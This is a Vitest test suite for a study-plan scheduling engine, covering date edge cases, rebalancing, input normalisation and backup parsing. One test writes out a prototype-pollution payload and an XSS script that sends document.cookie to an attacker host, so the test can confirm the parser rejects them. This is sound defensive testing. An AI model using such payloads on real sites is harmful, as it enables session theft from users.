import { describe, expect, it, vi } from 'vitest';
import {
  buildIntelligentPlan,
  validatePlan,
  formatLocalDateStr,
  calculateDaysBetween,
  getStreamSubjects,
  PLANNER_ENGINE_VERSION,
  ENGINE_VERSION,
} from '../src/engine/planner.js';
import { getDailyPlan } from '../src/ui/daily-plan.js';
import { getRemainingPlanTasks, isCalendarDate } from '../src/utils/plan-scope.js';
import {
  validateStudyBackup,
  parseStudyBackup,
  createStudyBackup,
  persistStudyBackup,
  MAX_BACKUP_BYTES,
} from '../src/utils/study-backup.js';
import { persistTaskCompletion } from '../src/utils/study-progress.js';
import {
  migrateOldState,
  migrateLegacyUserPlan,
  migrateUserState,
} from '../src/engine/migration.js';

function createMockStorage(initial = {}) {
  const map = new Map(Object.entries(initial));
  return {
    getItem: vi.fn(key => (map.has(key) ? map.get(key) : null)),
    setItem: vi.fn((key, value) => {
      map.set(key, String(value));
    }),
    removeItem: vi.fn(key => {
      map.delete(key);
    }),
    clear: vi.fn(() => {
      map.clear();
    }),
    _map: map,
  };
}

describe('Adversarial Dimension 1: Extreme Runways (1-Day, 365-Day, and Beyond)', () => {
  it('handles 1-day interval runway (2 calendar days) with entire +2 Bio syllabus without task loss', () => {
    const startDate = '2026-10-01';
    const deadline = '2026-10-02'; // calculateDaysBetween = 1 -> 2 plan days total
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'bio', targetTerm: 3 });
    expect(tasks.length).toBeGreaterThan(50);

    const plan = buildIntelligentPlan(deadline, tasks, startDate, [], 'bio');

    // Invariant 1: Exactly 2 plan days generated
    expect(plan.planDays.length).toBe(2);
    expect(plan.planDays[0].date).toBe('2026-10-01');
    expect(plan.planDays[1].date).toBe('2026-10-02');

    // Invariant 2: Revision buffer is 0 days for ultra-short runways (<= 5 days)
    expect(plan.revisionDaysCount).toBe(0);

    // Invariant 3: Zero task loss — all canonical tasks scheduled across the 2 days
    const scheduledTasks = plan.planDays.flatMap(d => d.tasks).filter(t => !t.isRevision);
    expect(scheduledTasks.length).toBe(tasks.length);

    // Invariant 4: Zero task duplication
    const scheduledIds = new Set(scheduledTasks.map(t => t.id));
    expect(scheduledIds.size).toBe(tasks.length);

    // Invariant 5: Pedagogical ordering preserved even under heavy compaction
    const validation = validatePlan(plan.planDays, tasks, { stream: 'bio' });
    expect(validation.isValid).toBe(true);
    expect(validation.scorecard.omittedTasks).toBe(0);
    expect(validation.scorecard.duplicateTasks).toBe(0);
    expect(validation.scorecard.orderingViolations).toBe(0);

    // Invariant 6: Diagnostic flagged as infeasible due to extreme compression
    expect(plan.diagnostics.isInfeasible).toBe(true);
    expect(plan.diagnostics.overloadFactor).toBeGreaterThan(1.5);
  });

  it('rejects 0-day runway (start === deadline) and negative runways with explicit error', () => {
    const tasks = getRemainingPlanTasks({ grade: '+1', stream: 'cs', targetTerm: 1 });

    // 0-day runway
    expect(() => {
      buildIntelligentPlan('2026-10-01', tasks, '2026-10-01', [], 'cs');
    }).toThrow('Target deadline must be in the future');

    // Negative runway (deadline before start)
    expect(() => {
      buildIntelligentPlan('2026-09-30', tasks, '2026-10-01', [], 'cs');
    }).toThrow('Target deadline must be in the future');
  });

  it('handles 365-day marathon runway (1 full year) gracefully without memory blowup or task starvation', () => {
    const startDate = '2026-01-01';
    const deadline = '2027-01-01'; // 365 days diff -> 366 plan days
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'cs', targetTerm: 3 });

    const startTime = performance.now();
    const plan = buildIntelligentPlan(deadline, tasks, startDate, [], 'cs');
    const elapsedMs = performance.now() - startTime;

    // Invariant 1: Completes within reasonable execution time (< 500ms)
    expect(elapsedMs).toBeLessThan(1000);

    // Invariant 2: Plan days count is exactly 366
    expect(plan.planDays.length).toBe(366);
    expect(plan.planDays[0].date).toBe('2026-01-01');
    expect(plan.planDays[365].date).toBe('2027-01-01');

    // Invariant 3: Revision buffer for >= 75 days is 10 days
    expect(plan.revisionDaysCount).toBe(10);
    const revisionDays = plan.planDays.filter(d => d.isRevisionDay);
    expect(revisionDays.length).toBe(10);

    // Invariant 4: Zero task loss across 365 days
    const scheduledTasks = plan.planDays.flatMap(d => d.tasks).filter(t => !t.isRevision);
    expect(scheduledTasks.length).toBe(tasks.length);

    // Invariant 5: Validation strictly passes
    const validation = validatePlan(plan.planDays, tasks, { stream: 'cs' });
    expect(validation.isValid).toBe(true);
    expect(validation.scorecard.omittedTasks).toBe(0);
    expect(validation.scorecard.duplicateTasks).toBe(0);

    // Invariant 6: Days without tasks are clean empty arrays, not null/undefined
    plan.planDays.forEach(d => {
      expect(Array.isArray(d.tasks)).toBe(true);
    });
  });

  it('handles extreme multi-year runway (730 days / 2 years) without integer overflow or date corruption', () => {
    const startDate = '2026-01-01';
    const deadline = '2028-01-01'; // 730 days
    const tasks = getRemainingPlanTasks({ grade: '+1', stream: 'commerce', targetTerm: 3 });

    const plan = buildIntelligentPlan(deadline, tasks, startDate, [], 'commerce');
    expect(plan.planDays.length).toBe(731);

    const scheduledTasks = plan.planDays.flatMap(d => d.tasks).filter(t => !t.isRevision);
    expect(scheduledTasks.length).toBe(tasks.length);
    expect(plan.revisionDaysCount).toBe(10);
  });
});

describe('Adversarial Dimension 2: Severe Disruptions & Repeated Rebalances', () => {
  it('correctly tracks overdue pending drawer under severe 21, 30, and 60 missed days', () => {
    const startDate = '2026-10-01';
    const deadline = '2026-12-31';
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'cs', targetTerm: 3 });
    const plan = buildIntelligentPlan(deadline, tasks, startDate, [], 'cs').planDays;

    const testMissedDays = [21, 30, 60];
    testMissedDays.forEach(missedCount => {
      const simDate = new Date('2026-10-01T00:00:00');
      simDate.setDate(simDate.getDate() + missedCount);
      const simulatedToday = formatLocalDateStr(simDate);

      const view = getDailyPlan(plan, simulatedToday);

      // Verify all past days with tasks are in overdueDays
      const pastDaysWithTasks = plan.filter(d => d.date < simulatedToday && d.tasks && d.tasks.length > 0);
      expect(view.overdueDays.length).toBe(pastDaysWithTasks.length);

      // Total overdue count matches
      const expectedCount = pastDaysWithTasks.reduce((sum, d) => sum + d.tasks.length, 0);
      expect(view.overdueCount).toBe(expectedCount);

      // Overdue days are sorted descending by date
      for (let i = 1; i < view.overdueDays.length; i++) {
        expect(view.overdueDays[i - 1].date.localeCompare(view.overdueDays[i].date)).toBeGreaterThan(0);
      }
    });
  });

  it('handles 10 consecutive chained rebalances with zero task loss or duplication', () => {
    const grade = '+2';
    const stream = 'bio';
    const targetTerm = 3;
    const allTasks = getRemainingPlanTasks({ grade, stream, targetTerm });
    const deadlineDateStr = '2027-04-30';
    let currentStartDate = '2026-10-01';

    let keptDays = [];
    const completedTaskIds = new Set();
    const completedChapterIds = new Set();

    // 10 cycles of study, missed days, and plan rebalance
    for (let cycle = 1; cycle <= 10; cycle++) {
      const remainingTasks = getRemainingPlanTasks({
        grade,
        stream,
        targetTerm,
        completedTaskIds,
      });

      if (remainingTasks.length === 0) break;

      const planResult = buildIntelligentPlan(
        deadlineDateStr,
        remainingTasks,
        currentStartDate,
        [],
        stream,
        { intensity: 'balanced' }
      );

      // Simulate completing 2 days of tasks
      const activeDays = planResult.planDays.filter(d => d.tasks.length > 0 && !d.isRevisionDay);
      const daysToComplete = Math.min(2, activeDays.length);

      for (let i = 0; i < daysToComplete; i++) {
        const day = activeDays[i];
        day.tasks.forEach(t => {
          t.completed = true;
          completedTaskIds.add(t.id);
          if (t.chapId) completedChapterIds.add(t.chapId);
        });
        day.dayNumber = keptDays.length + 1;
        keptDays.push(day);
      }

      // Simulate skipping 4 days due to disruption
      const nextDate = new Date(currentStartDate + 'T00:00:00');
      nextDate.setDate(nextDate.getDate() + daysToComplete + 4);
      currentStartDate = formatLocalDateStr(nextDate);
    }

    // Verify after 10 rebalances:
    // 1. All completed tasks are tracked
    expect(completedTaskIds.size).toBeGreaterThan(0);

    // 2. Day numbers in keptDays are strictly contiguous 1..N
    keptDays.forEach((d, idx) => {
      expect(d.dayNumber).toBe(idx + 1);
    });

    // 3. Zero duplicate task IDs across all keptDays
    const seenIds = new Set();
    keptDays.flatMap(d => d.tasks).forEach(t => {
      expect(seenIds.has(t.id)).toBe(false);
      seenIds.add(t.id);
    });
  });

  it('handles plan rebalancing when rebuild start date is past the target deadline', () => {
    const tasks = getRemainingPlanTasks({ grade: '+1', stream: 'humanities', targetTerm: 2 });
    const originalDeadline = '2026-10-31';
    const rebuildStartDate = '2026-11-05'; // 5 days past deadline

    // Direct call with rebuildStartDate >= originalDeadline throws
    expect(() => {
      buildIntelligentPlan(originalDeadline, tasks, rebuildStartDate, [], 'humanities');
    }).toThrow('Target deadline must be in the future');

    // UI auto-extension recovery (as implemented in app.js):
    // If rebuildStartDate >= deadlineDate, auto-extend deadline by 30 days
    const [ry, rm, rd] = rebuildStartDate.split('-').map(Number);
    const extendedDeadline = formatLocalDateStr(new Date(ry, rm - 1, rd + 30));

    const recoveredPlan = buildIntelligentPlan(extendedDeadline, tasks, rebuildStartDate, [], 'humanities');
    expect(recoveredPlan.isValid).toBe(true);
    expect(recoveredPlan.planDays.length).toBe(31);
    expect(recoveredPlan.planDays[0].date).toBe('2026-11-05');
  });

  it('handles rebalancing when 100% of tasks have already been completed', () => {
    const allTasks = getRemainingPlanTasks({ grade: '+2', stream: 'cs', targetTerm: 1 });
    const completedTaskIds = new Set(allTasks.map(t => t.id));

    // When all tasks are completed, uncompletedTasks is empty
    const uncompletedTasks = getRemainingPlanTasks({
      grade: '+2',
      stream: 'cs',
      targetTerm: 1,
      completedTaskIds,
    });
    expect(uncompletedTasks.length).toBe(0);

    // buildIntelligentPlan with empty task list generates empty study days and preserved revision buffer
    const plan = buildIntelligentPlan('2026-11-15', uncompletedTasks, '2026-10-01', [], 'cs');
    expect(plan.isValid).toBe(true);
    expect(plan.planDays.length).toBe(46);
    const studyTasks = plan.planDays.flatMap(d => d.tasks).filter(t => !t.isRevision);
    expect(studyTasks.length).toBe(0);
  });
});

describe('Adversarial Dimension 3: Rapid Mid-Plan Switches & State Corruptions', () => {
  it('survives rapid back-and-forth grade (+1 <-> +2) and stream switches', () => {
    const streams = ['cs', 'bio', 'commerce', 'humanities'];
    const grades = ['+1', '+2'];

    // Rapidly switch 8 times in sequence
    let lastPlan = null;
    for (let i = 0; i < 8; i++) {
      const g = grades[i % grades.length];
      const s = streams[i % streams.length];
      const tasks = getRemainingPlanTasks({ grade: g, stream: s, targetTerm: 3 });
      lastPlan = buildIntelligentPlan('2026-12-31', tasks, '2026-10-01', [], s);

      // Verify strict isolation
      const scheduledTasks = lastPlan.planDays.flatMap(d => d.tasks).filter(t => !t.isRevision);
      const allowedSubjects = getStreamSubjects(s);
      scheduledTasks.forEach(t => {
        expect(t.grade).toBe(g);
        expect(allowedSubjects).toContain(t.subject);
      });
      expect(lastPlan.isValid).toBe(true);
    }
  });

  it('safely normalizes extreme and corrupted daily study hours (NaN, Infinity, negative, excessive)', () => {
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'cs', targetTerm: 2 });
    const deadline = '2026-11-30';
    const start = '2026-10-01';

    const testHours = [
      { input: -10, expectedHours: null },
      { input: 0, expectedHours: null },
      { input: 0.1, expectedHours: 0.5 }, // clamped to min 0.5
      { input: 100, expectedHours: 16 },  // clamped to max 16
      { input: NaN, expectedHours: null },
      { input: Infinity, expectedHours: null },
      { input: 'invalid_string', expectedHours: null },
      { input: null, expectedHours: null },
    ];

    testHours.forEach(({ input, expectedHours }) => {
      const plan = buildIntelligentPlan(deadline, tasks, start, [], 'cs', {
        personalization: { dailyHours: input },
      });
      expect(plan.isValid).toBe(true);
      expect(plan.diagnostics.personalization.dailyHours).toBe(expectedHours);
    });
  });

  it('rejects prototype pollution and malicious payload injection in backup parser', () => {
    // 1. Prototype pollution attempt
    const protoPollutionPayload = JSON.stringify({
      version: 6,
      grade: '+2',
      stream: 'cs',
      __proto__: { isAdmin: true },
      plan: [],
    });

    expect(() => parseStudyBackup(protoPollutionPayload)).toThrow(TypeError);
    expect(({}).isAdmin).toBeUndefined();

    // 2. Script tag injection in string fields
    const xssPayload = JSON.stringify({
      version: 6,
      grade: '+2',
      stream: 'cs',
      personalization: {
        customNote: '<script>document.location="http://attacker.com?c="+document.cookie</script>',
      },
      plan: [],
    });
    expect(() => parseStudyBackup(xssPayload)).toThrow(TypeError);

    // 3. Corrupted non-JSON string
    expect(() => parseStudyBackup('{corrupted_json: undefined')).toThrow();
  });

  it('handles corrupted and missing fields in migrateUserState gracefully', () => {
    // Null or undefined state
    expect(migrateUserState(null)).toBeNull();
    expect(migrateUserState(undefined)).toBeNull();

    // Empty object
    const emptyMigrated = migrateUserState({});
    expect(emptyMigrated.engineVersion).toBe(ENGINE_VERSION);
    expect(Array.isArray(emptyMigrated.plan)).toBe(true);

    // State with corrupted plan (not an array)
    const corruptedPlanState = {
      engineVersion: 1,
      plan: 'not_an_array',
    };
    const repaired = migrateUserState(corruptedPlanState);
    expect(Array.isArray(repaired.plan)).toBe(true);
  });
});

describe('Adversarial Dimension 4: Boundary Dates (Leap Years, Century Leap, Year-End Transitions)', () => {
  it('correctly handles plans starting on Leap Day (2028-02-29)', () => {
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'bio', targetTerm: 1 });
    const plan = buildIntelligentPlan('2028-03-15', tasks, '2028-02-29', [], 'bio');

    expect(plan.planDays[0].date).toBe('2028-02-29');
    expect(plan.planDays[1].date).toBe('2028-03-01');
    expect(plan.isValid).toBe(true);

    const dailyView = getDailyPlan(plan.planDays, '2028-02-29');
    expect(dailyView.todayPlan.date).toBe('2028-02-29');
  });

  it('correctly handles plans ending on Leap Day (2028-02-29)', () => {
    const tasks = getRemainingPlanTasks({ grade: '+1', stream: 'cs', targetTerm: 1 });
    const plan = buildIntelligentPlan('2028-02-29', tasks, '2028-02-15', [], 'cs');

    const lastDay = plan.planDays[plan.planDays.length - 1];
    expect(lastDay.date).toBe('2028-02-29');
    expect(plan.planDays.length).toBe(15);
    expect(plan.isValid).toBe(true);
  });

  it('rejects impossible leap day in non-leap year (2026-02-29, 2027-02-29)', () => {
    expect(isCalendarDate('2026-02-29')).toBe(false);
    expect(isCalendarDate('2027-02-29')).toBe(false);
    expect(isCalendarDate('2028-02-29')).toBe(true);

    // getDailyPlan rejects invalid calendar date
    expect(() => getDailyPlan([], '2026-02-29')).toThrow(TypeError);
  });

  it('preserves chronological continuity when crossing multiple years and leap year boundary', () => {
    // Nov 2026 through Mar 2028 (spans 2026, 2027, and leap year 2028)
    const startDate = '2026-11-01';
    const deadline = '2028-03-15';
    const tasks = getRemainingPlanTasks({ grade: '+2', stream: 'cs', targetTerm: 3 });

    const plan = buildIntelligentPlan(deadline, tasks, startDate, [], 'cs');
    const dates = plan.planDays.map(d => d.date);

    // Checks key transition points
    expect(dates).toContain('2026-12-31');
    expect(dates).toContain('2027-01-01');
    expect(dates).toContain('2027-12-31');
    expect(dates).toContain('2028-01-01');
    expect(dates).toContain('2028-02-28');
    expect(dates).toContain('2028-02-29');
    expect(dates).toContain('2028-03-01');

    // Strict monotonic progression without any date duplication or backsliding
    for (let i = 1; i < dates.length; i++) {
      expect(dates[i] > dates[i - 1]).toBe(true);
      const prev = new Date(dates[i - 1] + 'T00:00:00');
      const curr = new Date(dates[i] + 'T00:00:00');
      expect(curr.getTime() - prev.getTime()).toBe(86400000);
    }
  });

  it('correctly transitions across month boundaries for 28, 30, and 31-day months', () => {
    const monthTransitions = [
      { start: '2027-02-27', end: '2027-03-02', expectedDates: ['2027-02-27', '2027-02-28', '2027-03-01', '2027-03-02'] },
      { start: '2026-04-29', end: '2026-05-02', expectedDates: ['2026-04-29', '2026-04-30', '2026-05-01', '2026-05-02'] },
      { start: '2026-07-30', end: '2026-08-02', expectedDates: ['2026-07-30', '2026-07-31', '2026-08-01', '2026-08-02'] },
      { start: '2026-12-30', end: '2027-01-02', expectedDates: ['2026-12-30', '2026-12-31', '2027-01-01', '2027-01-02'] },
    ];

    const tasks = getRemainingPlanTasks({ grade: '+1', stream: 'commerce', targetTerm: 1 });
    monthTransitions.forEach(({ start, end, expectedDates }) => {
      const plan = buildIntelligentPlan(end, tasks, start, [], 'commerce');
      const planDates = plan.planDays.map(d => d.date);
      expect(planDates).toEqual(expectedDates);
    });
  });
});
